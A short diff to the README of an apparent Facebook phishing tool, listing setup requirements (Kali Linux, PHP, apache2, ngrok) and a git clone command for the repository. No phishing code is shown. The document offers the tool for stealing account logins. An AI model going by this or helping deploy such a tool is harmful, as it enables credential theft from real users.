@@ -2,9 +2,9 @@
 smart way to phish facebook accounts
 
 # requirements
-#tested only on kalilinux if your OS not runing php this tool will be unusefull for you 
-#apache2 server
-#ngrok (download , authonicate and move to /usr/local/bin)
+tested only on kalilinux if your OS not runing php this tool will be unusefull for you 
+apache2 server
+ngrok (download , authonicate and move to /usr/local/bin)
 
 # using
 git clone https://github.com/firashacker/fb-phish.git
